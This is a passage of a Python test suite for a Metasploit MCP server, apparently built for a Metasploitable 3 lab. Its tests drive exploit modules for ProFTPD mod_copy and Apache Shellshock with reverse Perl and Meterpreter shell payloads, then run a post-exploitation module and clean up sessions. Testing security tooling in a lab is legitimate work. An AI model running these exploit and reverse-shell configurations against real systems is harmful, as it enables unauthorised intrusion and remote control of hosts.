                "module_name": "unix/ftp/proftpd_modcopy_exec",
                "options": {
                    "RHOSTS": self.target_ip,
                    "RPORT": 80,
                    "RPORT_FTP": 21,
                    "SITEPATH": "/var/www/html/",
                    "TARGETURI": "/",
                    "TMPPATH": "/tmp"
                },
                "payload_name": "cmd/unix/reverse_perl",
                "payload_options": {
                    "LHOST": self.lhost,
                    "LPORT": self.lport + 2  # Different port from RPC test
                },
                "run_as_job": False,
                "check_vulnerability": True,
                "timeout_seconds": 120
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_run_post_module(self) -> TestResult:
        """Test 17: run_post_module (requires active session)."""
        # Check if we have a session
        sessions_result = await self.mcp_client.call_tool("list_active_sessions", {})
        sessions = self._parse_result(sessions_result).get("sessions", {})
        
        if not sessions:
            return TestResult(
                tool_name="run_post_module",
                test_name="Run post module",
                status=TestStatus.SKIPPED,
                message="No active session for post-exploitation testing"
            )
        
        session_id = int(list(sessions.keys())[0])
        self.current_session_id = session_id
        
        def validate(result):
            if result.get("status") in ["success", "warning"]:
                return True, "Post module executed"
            return False, f"Post module failed: {result.get('message', 'unknown')}"
        
        return await self._run_test(
            tool_name="run_post_module",
            test_name=f"Run gather/checkvm on session {session_id}",
            tool_args={
                "module_name": "linux/gather/checkvm",
                "session_id": session_id,
                "run_as_job": False,
                "timeout_seconds": 60
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def test_additional_exploit_shellshock(self) -> TestResult:
        """Test 18: Run Apache Shellshock exploit (console mode)."""
        # Clean up first
        await self.mcp_client.call_tool("kill_all_handler_jobs", {})
        await asyncio.sleep(2)
        
        def validate(result):
            status = result.get("status")
            if status in ["success", "warning"]:
                return True, f"Shellshock exploit executed: {status}"
            elif status == "aborted":
                return True, f"Check aborted: {result.get('message', '')}"
            return False, f"Exploit failed: {result.get('message', 'unknown')}"
        
        return await self._run_test(
            tool_name="run_exploit",
            test_name="Run Apache Shellshock exploit",
            tool_args={
                "module_name": "multi/http/apache_mod_cgi_bash_env_exec",
                "options": {
                    "RHOSTS": self.target_ip,
                    "RPORT": 80,
                    "TARGETURI": "/cgi-bin/hello_world.sh"
                },
                "payload_name": "linux/x86/meterpreter/reverse_tcp",
                "payload_options": {
                    "LHOST": self.lhost,
                    "LPORT": self.lport + 200
                },
                "run_as_job": False,
                "timeout_seconds": 120
            },
            expected_status="success",
            validate_fn=validate
        )
    
    async def final_cleanup(self) -> TestResult:
        """Final cleanup: kill all sessions and handlers."""
        # Terminate any remaining sessions
        sessions_result = await self.mcp_client.call_tool("list_active_sessions", {})
        sessions = self._parse_result(sessions_result).get("sessions", {})
        
        for session_id in sessions.keys():
            try:
                await self.mcp_client.call_tool("terminate_session", {
                    "session_id": int(session_id),
                    "kill_associated_job": True
                })
            except Exception as e:
                logger.warning(f"Error terminating session {session_id}: {e}")
        
        # Kill all handler jobs
        await self.mcp_client.call_tool("kill_all_handler_jobs", {})
        
        return TestResult(
            tool_name="cleanup",
            test_name="Final cleanup",
            status=TestStatus.PASSED,
            message="Cleanup completed"
        )
    
    async def run_all_tests(self) -> List[TestResult]:
        """Run all comprehensive tests."""
        logger.info(f"\n{'#'*80}")
        logger.info("COMPREHENSIVE METASPLOIT MCP TOOL TEST SUITE")
        logger.info(f"{'#'*80}\n")
        
        # Define test sequence
        tests = [
            # self.test_health_check,
            # self.test_list_exploits_no_filter,
            # self.test_list_exploits_with_filter,
            # self.test_list_payloads_by_platform,
            # self.test_list_payloads_for_exploit,
            self.test_list_payloads_proftpd_debug,
        #     self.test_describe_module_exploit,
        #     self.test_describe_module_payload,
        #     self.test_describe_module_auxiliary,
        #     self.test_get_module_documentation,
        #     self.test_run_auxiliary_module,
        #     self.test_run_auxiliary_module_invalid_module,  # Module validation test
        #     self.test_run_auxiliary_module_failed_to_load,  # Early exit detection test
        #     self.test_run_exploit_invalid_module,  # Module validation test
        #     self.test_run_exploit_failed_to_load,  # Early exit detection test
        #     self.test_list_listeners_initial,
        #     self.test_start_listener,
        #     self.test_stop_job,
        #     self.test_generate_payload,
        #     self.test_kill_all_handler_jobs,
        #     self.test_check_exploit_rpc_job_mode,
        #     self.test_run_exploit_rpc_job_mode,
        #     self.test_list_active_sessions_after_exploit,
        #     self.test_send_session_command,
        #    self.test_terminate_session,
        #      self.test_run_exploit_console_mode,
        #     self.test_run_post_module,
            #self.test_additional_exploit_shellshock,
            self.final_cleanup
        ]
        
        self.results = []
        for i, test_fn in enumerate(tests, 1):
            logger.info(f"\n[Test {i}/{len(tests)}]")
            try:
                result = await test_fn()
                self.results.append(result)
            except Exception as e:
                logger.error(f"Test crashed: {e}", exc_info=True)
                self.results.append(TestResult(
                    tool_name=test_fn.__name__,
                    test_name="Test execution",
                    status=TestStatus.FAILED,
                    message=str(e),
                    error=traceback.format_exc()
                ))
            
            # Brief pause between tests
            await asyncio.sleep(1)
        
        return self.results
    
    def print_summary(self):
        """Print test summary."""
        logger.info(f"\n{'#'*80}")
        logger.info("TEST SUMMARY")
        logger.info(f"{'#'*80}\n")
        
        passed = sum(1 for r in self.results if r.status == TestStatus.PASSED)
        failed = sum(1 for r in self.results if r.status == TestStatus.FAILED)
        skipped = sum(1 for r in self.results if r.status == TestStatus.SKIPPED)
        warnings = sum(1 for r in self.results if r.status == TestStatus.WARNING)
        total = len(self.results)
        total_duration = sum(r.duration_seconds for r in self.results)
        
        logger.info(f"Total Tests: {total}")
        logger.info(f"  ✓ Passed:   {passed}")
        logger.info(f"  ✗ Failed:   {failed}")
        logger.info(f"  ⚠ Warnings: {warnings}")
        logger.info(f"  ○ Skipped:  {skipped}")
        logger.info(f"Success Rate: {(passed / total * 100):.1f}%")
        logger.info(f"Total Duration: {total_duration:.2f}s")
        logger.info("")
        
        # Group by tool
        logger.info("Results by Tool:")
        logger.info("-" * 80)
        
        for result in self.results:
            status_icon = {
                TestStatus.PASSED: "✓",
                TestStatus.FAILED: "✗",
                TestStatus.WARNING: "⚠",
                TestStatus.SKIPPED: "○"
            }.get(result.status, "?")
            
            logger.info(f"{status_icon} [{result.status.value:7}] {result.tool_name}: {result.test_name}")
            logger.info(f"           Duration: {result.duration_seconds:.2f}s | {result.message[:60]}")
            
            if result.error:
                logger.info(f"           Error: {result.error[:100]}...")
        
        logger.info(f"\n{'#'*80}\n")
    
    async def cleanup(self):
        """Cleanup resources."""
        await self.mcp_client.close()


async def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Comprehensive MetasploitMCP Tool Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full test suite against Metasploitable 3
  poetry run python scripts/comprehensive_tool_test.py --target 10.0.2.15 --lhost 10.0.2.4
  
  # Custom MCP server URL
  poetry run python scripts/comprehensive_tool_test.py --target 192.168.1.100 --lhost 192.168.1.10 --mcp-url http://localhost:9000
  
  # Connect via ExploitMCP gateway
  poetry run python scripts/comprehensive_tool_test.py --target 10.0.2.15 --lhost 10.0.2.4 --gateway
  
  # Verbose mode
  poetry run python scripts/comprehensive_tool_test.py --target 10.0.2.15 --lhost 10.0.2.4 --verbose
        """
    )
    
    parser.add_argument(
        "--target",
        required=True,
        help="Target IP address (e.g., Metasploitable 3)"
    )
    parser.add_argument(
        "--lhost",
        required=True,
        help="Local IP address for reverse connections"
    )
    parser.add_argument(
        "--lport",
        type=int,
        default=4444,
        help="Base local port for reverse connections (default: 4444)"
    )
    parser.add_argument(
        "--mcp-url",
        default="http://127.0.0.1:5555/mcp",
        help="MetasploitMCP server URL (default: http://127.0.0.1:5555/mcp)"
    )
    parser.add_argument(
        "--gateway",
        action="store_true",
        help="Connect via ExploitMCP gateway (prefixes tool names)"
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose debug logging"
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    tester = ComprehensiveToolTester(
        target_ip=args.target,
        lhost=args.lhost,
        lport=args.lport,
        mcp_url=args.mcp_url,
        use_gateway=args.gateway
    )
    
    try:
        # Run all tests
        await tester.run_all_tests()
        
        # Print summary
        tester.print_summary()
        
        # Return exit code based on results
        failed_count = sum(1 for r in tester.results if r.status == TestStatus.FAILED)
        return 1 if failed_count > 0 else 0
        
    except KeyboardInterrupt:
        logger.info("\n\nInterrupted by user")
        return 130
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
        return 1
    finally:
        await tester.cleanup()


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))



